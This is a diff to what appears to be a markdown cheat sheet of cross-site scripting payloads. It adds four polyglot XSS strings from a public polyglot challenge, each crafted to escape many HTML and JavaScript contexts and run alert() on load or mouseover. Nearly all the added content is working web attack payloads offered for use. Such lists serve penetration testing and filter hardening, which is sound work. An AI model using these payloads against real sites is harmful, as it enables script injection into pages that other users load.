@@ -354,6 +354,22 @@ Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
 ```
 
+Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)
+
+```javascript
+# by crlf
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+# by europa
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+
+# by EdOverflow
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+# by h1/ragnar
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
+```
+
 ## Filter Bypass and exotic payloads
 
 Bypass case sensitive
